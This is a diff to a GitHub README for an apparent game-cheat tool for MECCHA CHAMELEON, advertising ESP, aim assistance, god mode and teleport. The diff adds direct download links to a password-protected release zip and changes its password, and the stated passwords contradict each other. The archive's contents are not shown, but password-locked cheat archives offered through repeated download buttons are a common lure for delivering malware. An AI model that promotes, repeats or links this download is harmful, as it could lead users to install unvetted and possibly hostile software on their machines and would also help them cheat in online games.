@@ -1,18 +1,19 @@
-# 🦎 Meccha-Chameleon-Auto-Painter
+# 🦎 Meccha-Chameleon-Auto-Painter 🦎
 
 Complete Utility Tool for MECCHA CHAMELEON
 
 ESP · Aim Assistance · God Mode · Teleport · Speed Control · Auto Paint
 
 <img width="1649" height="776" alt="newnewnew" src="https://github.com/user-attachments/assets/2b3ce5a2-c4d5-4b28-9642-6afc2ff3c320" />
-
+<br><br>
 <p align="center">
-  <a href="YOUR_RELEASE_LINK">
+  <a href="https://github.com/cutebirdslover/Meccha-Chameleon-Auto-Painter/releases/download/v1.1.2/MecchaAutoPainter.zip">
     <img src="https://img.shields.io/badge/DOWNLOAD%20LATEST%20VERSION%20%28.ZIP%29-181b20?style=flat-square&logo=github&logoColor=white" alt="Download Latest Version">
   </a>
   <br><br>
-  Password: <code>Sekira</code>
+  Password: <code>Paint</code>
 </p>
+
 ---
 
 ## ✨ Features
@@ -58,6 +59,12 @@ ESP · Aim Assistance · God Mode · Teleport · Speed Control · Auto Paint
 ---
 
 ## ⚙️ Installation
+<a href="https://github.com/cutebirdslover/Meccha-Chameleon-Auto-Painter/releases/download/v1.1.2/MecchaAutoPainter.zip">
+    <img src="https://img.shields.io/badge/DOWNLOAD%20LATEST%20VERSION%20%28.ZIP%29-181b20?style=flat-square&logo=github&logoColor=white" alt="Download Latest Version">
+  </a>
+  
+  Password: <code>Paint</code>
+</p>
 
 1. Click the download button above
 2. Extract the archive to a folder **PASSWORD "AutoPainter"**
